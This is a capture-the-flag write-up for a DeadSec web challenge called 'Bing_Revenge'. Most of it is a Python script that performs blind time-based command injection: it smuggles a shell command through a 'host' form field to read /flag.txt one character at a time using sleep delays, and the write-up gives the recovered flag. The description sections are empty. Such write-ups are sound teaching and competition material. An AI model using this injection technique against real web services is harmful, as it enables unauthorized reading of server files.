# Web/Bing_Revenge

## Description

## Challenge Overview

## Exploit

```py
import requests
from string import printable
from time import time
from tqdm import tqdm

baseURL = "https://7c613d88f8c24c61ed3939b2.deadsec.quest"
# baseURL = "http://localhost:5000"

def flag(host):
    url = baseURL + "/flag"
    sendData = {"host": host}
    r = requests.post(url, data=sendData)
    res = r.text

    res = res.split("<pre>")[1]
    res = res.split("</pre>")[0]
    return res

correctFlag = "DEAD{"
wait = 10
for i in range(len(correctFlag)+1, 60+1):
    for letter in tqdm("}" + printable):
        exploit = f'; if [ $(cat /flag.txt | cut -c {i}) = "{letter}" ]; then sleep {wait}; fi; '
        start = time()
        flag(exploit)
        end = time()
        time_taken = end - start
        if (time_taken > wait):
            correctFlag += str(letter)
            break
    print(correctFlag)

print(correctFlag)

```

The script might give a `Connection Error` sometimes because of the server sometimes so you will then have to replace the `correctFlag` with the portion of the flag you have found out till now.

This gives us our flag `DEAD{f93efeba-0d78-4130-9114-783f2cd337e3}`.